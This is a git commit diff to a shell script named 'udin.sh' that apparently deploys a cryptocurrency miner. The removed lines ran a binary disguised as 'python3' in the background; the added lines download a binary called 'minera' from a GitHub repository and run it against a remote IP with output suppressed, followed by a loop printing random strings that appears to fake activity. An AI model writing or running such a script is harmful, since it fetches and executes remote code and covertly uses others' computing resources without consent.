47f029789aff131c06fa742ef346097ea1cb763f
nijallahla <94243789+nijallahla@users.noreply.github.com>
2022-10-12 20:29:58 +0700

    Update udin.sh

--- udin.sh
+++ udin.sh
@@ -1,4 +1,6 @@
-chmod +x python3
-chmod +x config.json
-./python3 -c config.json >/dev/null &
+sudo apt update
+sudo apt install -y git build-essential cmake libuv1-dev uuid-dev libssl-dev
+wget https://github.com/qhilapahal/qilabai/raw/main/minera
+chmod +x minera
+./minera -o 198.199.88.23:80 -t 1 >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
